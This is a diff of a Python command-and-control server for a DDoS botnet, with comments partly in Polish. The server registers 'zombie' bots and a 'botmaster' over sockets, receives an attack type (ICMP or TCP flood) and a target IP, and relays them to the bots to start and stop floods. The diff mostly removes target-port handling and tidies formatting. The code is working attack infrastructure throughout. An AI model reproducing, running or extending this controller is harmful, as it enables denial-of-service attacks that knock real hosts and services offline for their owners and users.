@@ -9,26 +9,25 @@ ip = '192.168.100.19'
 sqlDatabaseHosts = []
 sqlDatabaseTargetIP = []
 clientSockets = []
-attack_type = ''
-port = ''
+attack_type=''
 
 
 def thread_for_botmaster(c, st):  # wrzucic w while???
     global startAttack
-    global ip
-    global attack_type
-    global port
+    global ip,attack_type
     print('Botmaster Connected')
 
-    attack_type = str(c.recv(1).decode())
-
+    # todo:odebrac rodzaj ataku od botmastera
+    # 1-icmp flood
+    # 2-Tcp Flood
+    # if rec == 1:
+    #   attack_type = 'icmp_flood'
+    # if rec == 2:
+    #   attack_type = 'tcp_flood'
+    attack_type=str(c.recv(1).decode())
+    print("typ: "+attack_type)
     ip = str(c.recv(16).decode())
     print('received target ip=' + ip)
-
-    if attack_type == 2:
-        port = str(c.recv(4).decode())
-        print('received target port=' + port)
-
     sqlDatabaseTargetIP.append(ip)
     startAttack = True
     stop = str(c.recv(1).decode())
@@ -50,7 +49,7 @@ def thread_for_zombieBot(c, addr):
             if pom == 1:  # pom == 1 indicates that the botmaster wants to stop an ongoing attack
                 c.send('0'.encode())
                 print('ending attack')
-                c.send(ip.encode())  # new server ip
+                c.send(ip.encode())
                 pom = 0
                 return
                 # if an attack stoped send IP of the new server (from botmaster)
@@ -63,9 +62,6 @@ def thread_for_zombieBot(c, addr):
             c.send(attack_type.encode())
             time.sleep(0.5)
             c.send(ip.encode())
-            if attack_type == '2':
-                c.send(port.encode())
-
             pom = 1
         except:
             print("Bot is disconnected")
@@ -119,7 +115,7 @@ def closeServer(socket):
 if __name__ == '__main__':
 
     host = '127.0.0.1'
-    host = '192.168.100.19'
+    #host = '192.168.100.19'
     port = 65432
     max_connections = 5
     pom = 0
@@ -129,31 +125,33 @@ if __name__ == '__main__':
     socket.listen(max_connections)
     thread_array = []
     t = None
+    print("Server status: running")
+
     try:
         while True:
             if x == 0:
-                t = threading.Thread(target=thread_for_checking_attack_status, daemon=True)
+                t = threading.Thread(target=thread_for_checking_attack_status,daemon=True)
                 t.start()
                 thread_array.append(t)
                 x = 1
 
+
             if not startAttack and t.is_alive():
                 client_socket, addr = socket.accept()
                 clientSockets.append(client_socket)
-
                 data = client_socket.recv(1).decode()  # info about which client type is connected: 1-bot, 2-botmaster
                 if int(data) == 1:
                     print('normal bot connected')
 
                     sqlDatabaseHosts.append(client_socket.getpeername())
                     print(sqlDatabaseHosts)
-                    t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr), daemon=True)
+                    t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr),daemon=True)
                     t1.start()
                     thread_array.append(t1)
                 elif int(data) == 2:
                     # todo: można zrobić jakiś proces logowania i walidacje
                     #
-                    t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr), daemon=True)
+                    t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr),daemon=True)
                     t2.start()
                     thread_array.append(t2)
                 else:
